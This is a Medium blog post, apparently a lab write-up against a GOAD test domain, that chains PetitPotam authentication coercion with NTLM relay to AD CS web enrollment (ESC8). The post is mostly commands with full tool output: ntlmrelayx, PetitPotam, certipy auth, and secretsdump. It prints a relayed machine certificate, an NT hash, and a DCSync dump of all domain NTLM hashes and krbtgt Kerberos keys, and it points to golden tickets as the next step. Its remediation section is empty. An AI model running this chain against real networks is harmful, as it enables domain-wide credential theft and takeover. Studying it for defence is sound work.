---
title: "Ad Chain Part 1: Leveraging ESC8 & PetitPotam for Domain Compromise"
description: "Hi Folks, I’mMohamed Eletreby.This is my first publication on Medium. Today, I’ll discuss a technique I used to gain access to Active Directory from a non-domain-joined system, which can lead to a dom"
pubDate: 2024-08-09
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 5
coverImage: "https://cdn-images-1.medium.com/max/800/1*drxbpVHfi_yyc_H-JL2EeQ.png"
---

---

### Ad Chain Part 1: Leveraging ESC8 & PetitPotam for Domain Compromise

![](https://cdn-images-1.medium.com/max/800/1*drxbpVHfi_yyc_H-JL2EeQ.png)

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*weEIv7CaPMXn1K9d.jpeg)

*Free Palestine with every single drop of my blood*

Hi Folks, I’m ***Mohamed Eletreby*.**This is my first publication on Medium. Today, I’ll discuss a technique I used to gain access to Active Directory from a non-domain-joined system, which can lead to a domain compromise relatively easily. I’ll focus specifically on vulnerabilities in this context. This topic was highlighted by [**Harmj0y **](https://x.com/harmj0y)and [**Lee Christensen**](https://x.com/tifkin_)** **in his excellent research paper on Active Directory Certificate Services, titled (*“*[*Certified Pre-Owned: Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)*” )*

![](https://cdn-images-1.medium.com/max/800/1*ghlhMBK5tNee0p1-NCwMkQ.jpeg)

*ESC8 in Action*

![](https://cdn-images-1.medium.com/max/800/1*sooiRDkWOFnkrivP_aouJg.png)

*Attack Architecture*

I will approach this article from the perspective of a non-domain-joined machine.**But first, let’s define what PetitPotam and DCSync are.**

> “PetitPotam is a proof of concept (POC) exploit that enables a new variant of NTLM relay attacks that target the Active Directory Certificate Service (ADCS).”

> “A DCSync attack uses commands in Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to pretend to be a domain controller (DC) in order to get user credentials from another DC. These attacks leverage what is a necessary function in Active Directory, which complicates attempts to prevent them.”

### 📌ESC8 From Linux Host

### Enumerating for PetitPotam vulnerability.

Let’s start by determining whether this host is vulnerable to PetitPotam.

- I will use [netexec](https://www.netexec.wiki/)

```bash
┌──(root㉿kali)-[/home/kali/HTB/Goad]└─# nxc smb 192.168.56.12 -M petitpotamSMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)PETITPOTAM  192.168.56.12   445    MEEREEN          VULNERABLEPETITPOTAM  192.168.56.12   445    MEEREEN          Next step: https://github.com/topotam/PetitPotam
```

### Enumerating for ESC8

But if you have any credentials for this domain controller, you can enumerate its vulnerabilities in several ways. I’ll use `netexec` and `Certipy` for this purpose. Unfortunately, `netexec` only supports LDAP for this step, so I relied on `Certipy`. Keep in mind that these steps are for situations where you already have credentials. In my attack path, however, I didn't need them and another thing is esc is in web enrollment so if you see path for (http://<IP CA>/certsrv/certfnsh.asp) this mean you can check for this attack (ESC8)like this

![](https://cdn-images-1.medium.com/max/800/1*fPh3iP9K4q5sN8d4WHxUWg.png)

*here you dont’ have any creds but just check for ESC8 web Enrollment*

![](https://cdn-images-1.medium.com/max/1200/1*nFo0OoomE_feDexzuh1ZcA.png)

*here we have creds and of course we checked for web enrollment and know this vulnerable to (ESC8)*

First Thing i will do it if fireing impacket-ntlmrelayx to relay for smb

```text
impacket-ntlmrelayx  -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController -debug
```

Where Are not in domain joined machine so after running `ntlmrealyx` i will fire `petitpotam `Explolit to force Authentication ,we set our listener and domain controller ip(`python3 PetitPotam.py <attack host IP> <Domain Controller IP>`) ,This is done by exploiting the MS-EFSRPC protocol through the EfsRpcOpenFileRaw API call, which forces the target machine account to authenticate to another system. It can be executed with standard user credentials by specifying the IP address of the system where NTLM Relay is set up and the IP address of the CA but i will just use standard command to just force authenticaiton ( i can use `coercer `to do than in same way and [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) same eploite)

```bash
┌──(root㉿kali)-[/home/…/HTB/Goad/Esc8/PetitPotam]└─# ./PetitPotam.py 192.168.56.103 meereen.essos.local                                                                                                             ___            _        _      _        ___            _                                  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __                |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \              _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|           _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|           "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'                                                        PoC to elicit machine account authentication via some MS-EFSRPC functions                                      by topotam (@topotam77)                           Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRNTrying pipe lsarpc[-] Connecting to ncacn_np:meereen.essos.local[\PIPE\lsarpc][+] Connected![+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e[+] Successfully bound![-] Sending EfsRpcOpenFileRaw![+] Got expected ERROR_BAD_NETPATH exception!![+] Attack worked!
```

### Cateching Bae64 in merren.essoss.local fromntlmrelayx

```bash
└─# impacket-ntlmrelayx  -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController -debugImpacket v0.12.0.dev1 - Copyright 2023 Fortra[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket[*] Protocol Client RPC loaded..[*] Protocol Client SMTP loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client DCSYNC loaded..[*] Protocol Client SMB loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client IMAPS loaded..[+] Protocol Attack IMAP loaded..[+] Protocol Attack IMAPS loaded..[+] Protocol Attack MSSQL loaded..[+] Protocol Attack DCSYNC loaded..[+] Protocol Attack RPC loaded..[+] Protocol Attack HTTP loaded..[+] Protocol Attack HTTPS loaded..[+] Protocol Attack SMB loaded..[+] Protocol Attack LDAP loaded..[+] Protocol Attack LDAPS loaded..[*] Running in relay mode to single host[*] Setting up SMB Server[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.56.12, attacking target http://192.168.56.23[*] HTTP server returned error code 200, treating as a successful login[*] Authenticating against http://192.168.56.23 as ESSOS/MEEREEN$ SUCCEED[+] No more targets[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.56.12 controlled, but there are no more targets left![*] Generating CSR...[*] CSR generated![*] Getting certificate...[*] GOT CERTIFICATE! ID 6[*] Base64 certificate of user MEEREEN$: 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
```

i make this attack before and the certificate was (`.pfx`) wo i will use same extension to get tgt from [certipy ](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc8)i you don’t know certipy is awesome tool to do some ADCS Attacks like what we do now (ESC8) *you can also use *[*PKINITtool*](https://github.com/dirkjanm/PKINITtools)* to to same steps to get TGT*

```bash
┌──(root㉿kali)-[/home/kali/HTB/Goad/Esc8]└─# certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12                                              Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: meereen$@essos.local[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to 'meereen.ccache'[*] Trying to retrieve NT hash for 'meereen$'[*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:d477f3be7269545c3a9251d861b8434e
```

as i say i will put pfx certificate and **ip **of Domain Controller and vola get **TGT **now i can make Fantastic DCSync by `impacket-secretdump`

```bash
┌──(root㉿kali)-[/home/kali/HTB/Goad/Esc8]└─# export KRB5CCNAME=meereen.ccache                                                                                                        ┌──(root㉿kali)-[/home/kali/HTB/Goad/Esc8]└─# impacket-secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.localImpacket v0.12.0.dev1 - Copyright 2023 Fortra[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33d6ecacb10e883f68751fae9bc3daaa:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:d477f3be7269545c3a9251d861b8434e:::BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:90a682a5ad336f432521e25aa2490d0c:::gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:9722db0c798615f8e6e61033edc72746:::SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:7d680ad72444c5852ba2c35e768255c2:::[*] Kerberos keys grabbedkrbtgt:aes256-cts-hmac-sha1-96:135954c4fe1ababa6907e245c7a0bcb59f6b3103afba319cbf366fe5d5cd0ab4krbtgt:aes128-cts-hmac-sha1-96:ffd961471fc10f5d3bbe27fb2770d868krbtgt:des-cbc-md5:644cc786687fc291daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69cdaenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cdviserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96eviserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3eviserys.targaryen:des-cbc-md5:70528fa13bc1f2a1khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ackhal.drogo:des-cbc-md5:b5ec4c1032ef020djorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ecejorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671jorah.mormont:des-cbc-md5:b926916289464ffbmissandei:aes256-cts-hmac-sha1-96:41d08ceba69dde0e8f7de8936b3e1e48ee94f9635c855f398cd76262478ffe1cmissandei:aes128-cts-hmac-sha1-96:0a9a4343b11f3cce3b66a7f6c3d6377amissandei:des-cbc-md5:54ec15a8c8e6f44fdrogon:aes256-cts-hmac-sha1-96:2f92317ed2d02a28a05e589095a92a8ec550b5655d45382fc877f9359e1b7fa1drogon:aes128-cts-hmac-sha1-96:3968ac4efd4792d0acef565ac4158814drogon:des-cbc-md5:bf1c85a7c8fdf237sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8sql_svc:des-cbc-md5:91d6b0df31b52a3dMEEREEN$:aes256-cts-hmac-sha1-96:11d18aefc47b80883efdd4f77644aaacf6f40973c48f8374320b1b82e0622c32MEEREEN$:aes128-cts-hmac-sha1-96:fc53492ef99d062d262591c73209f035MEEREEN$:des-cbc-md5:98b0ea1af7e6d967BRAAVOS$:aes256-cts-hmac-sha1-96:e3d8d31f771084c17da1bd20ca06915bc616eb3647c083174cb90b42590d83faBRAAVOS$:aes128-cts-hmac-sha1-96:6d064a6ad479de3bfbc9a74fd6b24be6BRAAVOS$:des-cbc-md5:8692bc4a9d61d386gmsaDragon$:aes256-cts-hmac-sha1-96:aad0f5f8d9d50ac10980b0257d601fd775933b85b4016a8251f1bad11cd4293fgmsaDragon$:aes128-cts-hmac-sha1-96:5d5ef2a58d5d20a486048bea627beaecgmsaDragon$:des-cbc-md5:cd2a321651572375SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:0555e43b621a51b60c9151c2205fdd24ab81343edead6e7f6239668f02f18506SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:71b8c0fd85c37f20bea99175e452a711SEVENKINGDOMS$:des-cbc-md
```

i will stop here but you can continue and here krbtgt you can make such golden ticket attack and more and more i just wnnaa make it simple but in next posts i will make AD Chains for common AD misconfiguration .

---

### Remediation and PreventionMy Accounts

#### Thisblog post is ideal for remediating this attack

---

[HTB](https://app.hackthebox.com/profile/1054724) |[LinkedIn](https://www.linkedin.com/in/0xmaverick/) |[x](https://x.com/mavric1337)

### 📌References

> 🔗 [https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

> 🔗 [https://attack.mitre.org/techniques/T1649/](https://attack.mitre.org/techniques/T1649/)

[https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8)

By Mohamed Eletreby on August 9, 2024.

Canonical link

Exported from Medium on April 20, 2026.